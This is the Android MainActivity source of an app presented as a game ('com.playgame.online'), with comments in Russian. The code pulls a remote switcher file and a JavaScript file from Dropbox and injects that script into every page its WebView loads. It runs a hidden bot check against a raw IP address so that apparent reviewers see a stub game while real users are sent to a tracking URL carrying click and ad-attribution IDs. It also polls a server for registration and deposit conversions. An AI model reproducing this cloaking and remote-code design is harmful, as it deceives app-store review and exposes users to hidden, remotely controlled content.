package com.playgame.online

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkRequest
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.webkit.*
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AlertDialog
import androidx.lifecycle.lifecycleScope
import bolts.AppLinks
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.net.CookieManager
import java.net.URL
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class MainActivity : AppCompatActivity(), FileChooseClient.ActivityChoser {

    private lateinit var okHttpClient: OkHttpClient
    private lateinit var webView: WebView
    private lateinit var preferences: SharedPreferences
    private lateinit var finalUrl: String
    private val historyDeque: Deque<String> = LinkedList()
    private lateinit var script: String
    private val handler = Handler(Looper.getMainLooper())
    private val conversionTask = object : Runnable {
        override fun run() {
            lifecycleScope.launch {
                val json = getConversion()
                val eventName = "event"
                val valueName = "value"
                if (json.has(eventName)) {
                    // при пустом value отправляем пробел
                    val value = json.optString(valueName) ?: " "
                    sendOnesignalEvent(json.optString(eventName), value)
                    sendFacebookEvent(json.optString(eventName), value)
                    sendAppsflyerEvent(json.optString(eventName), value)
                }
            }
            handler.postDelayed(this, 15000)
        }
    }
    override var uploadMessage: ValueCallback<Array<Uri>>? = null
    private var networkDialog: AlertDialog? = null

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            super.onAvailable(network)
            runOnUiThread { networkDialog?.hide() }
        }

        override fun onLost(network: Network) {
            super.onLost(network)
            runOnUiThread { networkDialog?.show() }
        }
    }


    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        initOkHttpClient() // инициализируем клиент например в методе onCreate
        preferences = this.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)

        // пробуем получить данные очереди историй ссылок из хранилища и добавляем, если есть
        val strDeque = preferences.getString("PREFS_DEQUE", null)
        if (!strDeque.isNullOrBlank()) {
            for (elem in strDeque.split(",")) {
                addToDeque(elem)
            }
        }

        // Инициализируем основной диалог
        networkDialog = AlertDialog.Builder(this).apply {
            setTitle("No Internet Connection")
            setMessage("Turn on the the network")
            setCancelable(false)
            setFinishOnTouchOutside(false)
        }.create()

        if (isConnectedToNetwork()) {


            webView = findViewById(R.id.webView)
            with(webView.settings) {
                loadWithOverviewMode = true
                javaScriptEnabled = true
                useWideViewPort = true
                domStorageEnabled = true
                javaScriptCanOpenWindowsAutomatically = true
            }
            val cookieManager = android.webkit.CookieManager.getInstance()
            cookieManager.setAcceptCookie(true)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                cookieManager.setAcceptThirdPartyCookies(webView, true)
            }
            webView.webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                    saveCustOfferIdFromUrl(url)
                    return false
                }

                override fun onPageFinished(view: WebView?, url: String?) {
                    saveCustOfferIdFromUrl(url)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                        android.webkit.CookieManager.getInstance().flush() // Синхронизируем cookie
                    }

                    super.onPageFinished(view, url)

                    url?.let { if (it != "about:blank" && it.isNotBlank()) addToDeque(it) } // Если ссылка не пустая и не равна null добавляем в очередь

                    script?.let { it ->
                        // пробуем получить queryId из хранилища, если его нет, получаем пустое значение
                        val queryId = preferences.getString("PREFS_QUERYID", "")
                        webView.evaluateJavascript(it) { // загружаем в вебвью полученный раннее скрипт
                            webView.evaluateJavascript("mainContextFunc('$queryId');") {} // вызываем javascript функцию mainContextFunc, добавив параметр queryId
                        }
                    }
                }
            }
            webView.webChromeClient = FileChooseClient(this)


            lifecycleScope.launch {
                // Скачиваем данные с файла переключателя
                val switcherUrl = "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0"

                val switcher = withContext(Dispatchers.IO) { getStringFromUrl(switcherUrl) }
                if (switcher.isNotBlank()) {
                    Log.d("AXAXXAX_sw", switcher)
                    if (switcher == "false") { // Допустим false в файле переключателе означает что нужно показать игру
                        // Показываем игру-заглушку
//                        startActivity(Intent(this@MainActivity, GameActivity::class.java))
//                        finish()
                        return@launch
                    }
                }
            }


            lifecycleScope.launch {
                // Скачиваем данные с файла переключателя
                // Скачиваем скрипт с дропбокса. await() обязателен, т.к. нужно дождаться окончания загрузки

//            val analyticsJs = "https://dl.dropboxusercontent.com/s/bw4pk9d1zouly06/analytics.js"
                Log.d("AXAXXAX", "anal")

                val analyticsJs = "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js"
                script = async(Dispatchers.IO) { getStringFromUrl(analyticsJs) }.await()
                // ... инициализация приложения, проверка очереди ссылок/ диплинка и т.д.
            }


            lifecycleScope.launch {
                Log.d("AXAXXAX_bot", isBot().toString())
                if (!isBot()) {
                    Log.d("AXAXXAX_bot", "!")
                    //  открываем заглушку
                    OneSignal.sendTag("nobot", "1")
                    OneSignal.sendTag("bundle", "com.playgame.online")

                    if (historyDeque.isNotEmpty()) {
                        webView.loadUrl(historyDeque.first)

                        historyDeque.removeFirst()
//                    Ебануть анимацию
//                    progressBar.visibility = View.GONE
                        Log.d("AXAXXAX", "fdfsff")
                        webView.visibility = View.VISIBLE
                    } else {
                        Log.d("AXAXXAX", "main")
                        mainInitialization()

                    }
                }
            }
        }
        else{
            val firstDialog = AlertDialog.Builder(this).apply {
                setTitle("No Internet Connection")
                setMessage("Turn on the the network and try again")
                setPositiveButton("Try Again", null)
                setCancelable(false)
                setFinishOnTouchOutside(false)
            }.create()
            firstDialog.show()
            firstDialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                if (isConnectedToNetwork()) {
                    firstDialog.dismiss()
                    mainInitialization() // дальнейшая инициализация
                }
            }
        }

    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == FileChooseClient.ActivityChoser.REQUEST_SELECT_FILE) {
            uploadMessage?.onReceiveValue(
                    WebChromeClient.FileChooserParams.parseResult(resultCode, data)
            ) ?: return

            uploadMessage = null
        }
    }

    private fun saveCustOfferIdFromUrl(url: String?) {
        try {
            url?.let {
                val uri = Uri.parse(it)
                if (uri.queryParameterNames.contains("cust_offer_id")) {
                    preferences
                            .edit()
                            .putString("PREFS_QUERYID", uri.getQueryParameter("cust_offer_id"))
                            .apply()
                }
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
        }
    }


    private fun getStringFromUrl(url: String): String {
        return URL(url).readText(Charsets.UTF_8)
    }

    private fun initOkHttpClient() {
        okHttpClient = OkHttpClient.Builder()
                .followSslRedirects(false)
                .followRedirects(false)
                .addNetworkInterceptor {
                    it.proceed(
                            it.request().newBuilder()
                                    .header("User-Agent", WebSettings.getDefaultUserAgent(this))
                                    .build()
                    )
                }.build()
    }


    private suspend fun isBot() = suspendCoroutine<Boolean> { cont ->
        val wv = WebView(this)
        wv.settings.javaScriptEnabled = true
        wv.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                val host = Uri.parse(url.toString()).host
                // пропускаем все редиректы кроме редиректов на https://bot/ и https://nobot/
                if (host == "bot" || host == "nobot") {
                    cont.resume(host != "nobot")
                }
                return false
            }
        }
        wv.loadUrl("http://78.47.77.100/")
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        intent?.extras?.getString("notification_url")?.let {
            historyDeque.clear()

            webView.loadUrl(it)
        }
    }

    private fun mainInitialization() {

        //  Используем корутины для удобства запросов в сеть
        lifecycleScope.launch {
            val fbDeeplink = getFBDeeplink()
            val afAdset = getAfAdset()

            // Ожидаем получения диплинка и адсета, затем в processParamsAndStart
            // добавляем параметры из диплинка и адсета в ссылку и открываем её в вебвью
            processParamsAndStart(fbDeeplink, afAdset)
//            processParamsAndStart("", "")
        }

    }

    private fun getClickId(): String {
        // Пробуем получить click_id из хранилища
        // Если его там нет, получим null
        var clickId = preferences.getString("PREFS_CLICK_ID", null)
        if (clickId == null) {
            // в случае если в хранилище нет click_id, генерируем новый
            clickId = UUID.randomUUID().toString()
            preferences.edit().putString("PREFS_CLICK_ID", clickId)
                    .apply() // и сохраняем в хранилище
        }
        return clickId
    }

    private fun processParamsAndStart(deeplink: String, conversion: String) {
        val trackingUrl ="https://tracksystem.com/index.php?key=abgirgqhar8i4hrghqui34h"

        val clickId = getClickId()
        val sourceId = BuildConfig.APPLICATION_ID

        finalUrl = "$trackingUrl&click_id=$clickId&source=$sourceId"

        if (deeplink.isNotBlank()) {
            finalUrl = "$finalUrl&$deeplink"
        }
        if (conversion.isNotBlank()) {
            val formattedConversion = conversion.replace("|", "&").replace("_", "=")
            finalUrl = "$finalUrl&$formattedConversion"
        }

        lifecycleScope.launch {
//            handler.post(conversionTask) // запускаем проверку конверсии по таймеру

            Log.d("AXAXXAX_loadfinalUrl", finalUrl)
            webView.loadUrl(finalUrl)
            // запуск вебвью с сформированной ссылкой finalUrl
        }
    }



    private suspend fun getAfAdset(): String = suspendCoroutine { continuation ->
        val prefsAdset = preferences.getString("PREFS_ADSET", null)
        if (prefsAdset != null) {
            continuation.resume(prefsAdset)
        } else {
            val conversionListener = object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                    val adsetKey = "adset"
                    var adsetValue = ""
                    data?.let {
                        if (it.containsKey(adsetKey)) {
                            adsetValue = it[adsetKey].toString()
                        }
                        // Данный блок сработает только при самом первом вызове onConversionDataSuccess
                        if (preferences.getString("PREFS_ADSET", null) == null) {
                            preferences.edit().putString("PREFS_ADSET", adsetValue).apply()
                            OneSignal.sendTag(adsetKey, adsetValue)
                            continuation.resume(adsetValue) // возвращаем адсет
                        }
                    } ?: continuation.resume("")
                }

                override fun onConversionDataFail(error: String?) {
                    continuation.resume("")
                }

                override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}

                override fun onAttributionFailure(error: String?) {
                    continuation.resume("")
                }
            }
            AppsFlyerLib.getInstance().registerConversionListener(this, conversionListener)
        }
    }


    private suspend fun getFBDeeplink(): String = suspendCoroutine { continuation ->
        // пробуем получить диплинк из хранилища
        val prefsDeeplink = preferences.getString("PREFS_DEEPLINK", null)
        if (prefsDeeplink != null) {
            continuation.resume(prefsDeeplink)
        } else { // Если диплинка в хранилище нет, берём из фейсбук коллбека
            FacebookSdk.setAutoInitEnabled(true)
            FacebookSdk.fullyInitialize()
            AppLinkData.fetchDeferredAppLinkData(applicationContext) { appLinkData ->
                // в переменную uri записывается отложенный диплинк appLinkData.targetUri.
                // Если он равен null, то диплинк берется из интента (getTargetUrlFromInboundIntent)
                val uri: Uri? =
                        appLinkData?.targetUri
                                ?: AppLinks.getTargetUrlFromInboundIntent(this, intent)

                // Если uri и query не равны null, сохраняем query в хранилище и возвращаем
                // иначе не сохраняем и возвращаем ""
                uri?.query?.let { preferences.edit().putString("PREFS_DEEPLINK", it).apply() }
                continuation.resume(uri?.query ?: "")
            }
        }
    }

    // Метод для добавления ссылки в очередь

    private fun addToDeque(url: String) {
        if (historyDeque.size > 5) {
            historyDeque.removeLast()
        }
        historyDeque.addFirst(url)
    }

    // Метод для перехода назад с помощью нашей очереди.
    // Если переход назад удался, возвращаем true. Иначе else
    private fun goBackWithDeque(): Boolean {
        try {
            if (historyDeque.size == 1) return false;
            // Удаляем текущую ссылку
            historyDeque.removeFirst()
            Log.d("AXAXXAX_load", historyDeque.first)
            webView.loadUrl(historyDeque.first)
            // Удаляем предыдущую ссылку, т.к. она повторно добавится в onPageFinished
            historyDeque.removeFirst()
            return true

        } catch (ex: NoSuchElementException) {
            ex.printStackTrace()
            return false
        }
    }

    fun sendOnesignalEvent(key: String, value: String) {
        OneSignal.sendTag(key, value)
    }

    // Отправка события в Facebook
    fun sendFacebookEvent(key: String, value: String) {
        val fb = AppEventsLogger.newLogger(this)

        val bundle = Bundle()
        when (key) {
            "reg" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                fb.logEvent(AppEventsConstants.EVENT_NAME_COMPLETED_REGISTRATION, bundle)
            }
            "dep" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                fb.logEvent(AppEventsConstants.EVENT_NAME_ADDED_TO_CART, bundle)
            }
        }
    }
    fun getConversion(): JSONObject {
        val conversionUrl = "https://freerun.site/conversion.php"
        return try {
            val response = okHttpClient // Делаем запрос, добавив к ссылке click_id
                    .newCall(Request.Builder().url("$conversionUrl?click_id=${getClickId()}").build())
                    .execute()
            JSONObject(response.body()?.string() ?: "{}")
        } catch (ex: Exception) {
            JSONObject("{}")
        }
    }


    // Отправка события в Appsflyer
    private fun sendAppsflyerEvent(key: String, value: String) {
        val values = HashMap<String, Any>()
        values[key] = value
        AppsFlyerLib.getInstance().trackEvent(this, key, values)
    }


    // Переопределяем событие нажатия кнопки back
    override fun onBackPressed() {
        if (!goBackWithDeque()) {
            super.onBackPressed() // если в очереди нет ссылок, возвращаемся назад по умолчанию
        }
    }

    @SuppressLint("MissingPermission")
    fun isConnectedToNetwork(): Boolean {
        val conn = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
        return conn?.activeNetworkInfo?.isConnected ?: false
    }

    // Регистрация постоянной проверки интернета
    @SuppressLint("MissingPermission")
    private fun registerNetworkCallback() {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        cm.registerNetworkCallback(NetworkRequest.Builder().build(), networkCallback)
    }


    private fun unregisterNetworkCallback() {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        cm.unregisterNetworkCallback(networkCallback)
    }

    // В lifecycle методе onStart регистрируем NetworkCallback
    override fun onStart() {
        super.onStart()
        registerNetworkCallback()
    }

    // В lifecycle методе onStart убираем его
    override fun onStop() {
        super.onStop()
        unregisterNetworkCallback()
        preferences.edit().putString("PREFS_DEQUE", historyDeque.reversed().joinToString(",")).apply()
    }

}
